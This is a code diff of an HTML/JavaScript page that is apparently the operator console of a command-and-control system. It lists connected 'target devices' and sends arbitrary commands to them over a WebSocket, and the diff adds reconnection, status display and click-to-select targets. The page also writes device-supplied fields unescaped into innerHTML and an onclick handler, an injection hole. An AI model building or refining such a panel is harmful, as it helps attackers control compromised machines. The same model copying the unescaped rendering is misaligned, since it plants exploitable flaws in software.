@@ -8,15 +8,18 @@
         body { font-family: monospace; background: #0f172a; color: #f8fafc; margin: 20px; }
         h2, h3 { color: #38bdf8; }
         ul { list-style-type: none; padding: 0; }
-        li { background: #1e293b; padding: 10px; margin-bottom: 5px; border-radius: 4px; border-left: 4px solid #38bdf8; }
+        li { background: #1e293b; padding: 10px; margin-bottom: 5px; border-radius: 4px; border-left: 4px solid #38bdf8; cursor: pointer; transition: background 0.2s; }
+        li:hover { background: #334155; }
         input, button { padding: 10px; margin: 5px 0; background: #1e293b; border: 1px solid #334155; color: #fff; border-radius: 4px; }
         button { background: #0284c7; cursor: pointer; font-weight: bold; }
         button:hover { background: #0369a1; }
         #output { background: #020617; color: #4ade80; padding: 15px; border-radius: 6px; height: 300px; overflow-y: auto; border: 1px solid #1e293b; white-space: pre-wrap; }
+        .status { font-size: 14px; margin-left: 10px; color: #f59e0b; }
+        .online { color: #22c55e; }
     </style>
 </head>
 <body>
-    <h2>Connected Devices</h2>
+    <h2>Connected Devices <span id="connStatus" class="status">(Connecting...)</span></h2>
     <ul id="deviceList"><li>Waiting for devices to register...</li></ul>
     
     <h3>Remote Execution Console</h3>
@@ -30,35 +33,57 @@
     <pre id="output">// Real-time command responses will appear here...</pre>
 
     <script>
-        const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
-        const ws = new WebSocket(`${protocol}${location.host}`);
+        let ws;
 
-        ws.onmessage = (event) => {
-            const data = JSON.parse(event.data);
-            if (data.type === 'device_list') {
-                const list = document.getElementById('deviceList');
-                if (data.devices.length === 0) {
-                    list.innerHTML = '<li>No active target devices connected.</li>';
-                } else {
-                    list.innerHTML = data.devices.map(d => 
-                        `<li><b>ID:</b> ${d.id} | <b>Platform:</b> ${d.info.platform} (${d.info.arch}) | <b>Uptime:</b> ${Math.floor(d.info.uptime / 3600)}h</li>`
-                    ).join('');
+        function connectWS() {
+            const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
+            ws = new WebSocket(`${protocol}${location.host}`);
+
+            ws.onopen = () => {
+                document.getElementById('connStatus').className = 'status online';
+                document.getElementById('connStatus').innerText = '(Connected)';
+            };
+
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                if (data.type === 'device_list') {
+                    const list = document.getElementById('deviceList');
+                    if (data.devices.length === 0) {
+                        list.innerHTML = '<li>No active target devices connected.</li>';
+                    } else {
+                        list.innerHTML = data.devices.map(d => 
+                            `<li onclick="selectDevice('${d.id}')"><b>ID:</b> ${d.id} | <b>Platform:</b> ${d.info.platform} (${d.info.arch}) | <b>Uptime:</b> ${Math.floor(d.info.uptime / 3600)}h <i>(Click to select)</i></li>`
+                        ).join('');
+                    }
                 }
-            }
-            if (data.type === 'log') {
-                const output = document.getElementById('output');
-                output.innerText += `\n[${new Date().toLocaleTimeString()}] [${data.deviceId}]:\n${data.result}\n----------------------------------------`;
-                output.scrollTop = output.scrollHeight;
-            }
-        };
+                if (data.type === 'log') {
+                    const output = document.getElementById('output');
+                    output.innerText += `\n[${new Date().toLocaleTimeString()}] [${data.deviceId}]:\n${data.result}\n----------------------------------------`;
+                    output.scrollTop = output.scrollHeight;
+                }
+            };
+
+            ws.onclose = () => {
+                document.getElementById('connStatus').className = 'status';
+                document.getElementById('connStatus').innerText = '(Disconnected - Reconnecting...)';
+                setTimeout(connectWS, 3000);
+            };
+        }
+
+        function selectDevice(id) {
+            document.getElementById('targetId').value = id;
+        }
 
         function sendCommand() {
             const targetId = document.getElementById('targetId').value.trim();
             const command = document.getElementById('cmd').value.trim();
             if (!targetId || !command) return alert('Provide target ID and command');
+            if (!ws || ws.readyState !== WebSocket.OPEN) return alert('WebSocket connection is offline.');
             ws.send(JSON.stringify({ type: 'command', targetId, command }));
             document.getElementById('cmd').value = '';
         }
+
+        connectWS();
     </script>
 </body>
 </html>
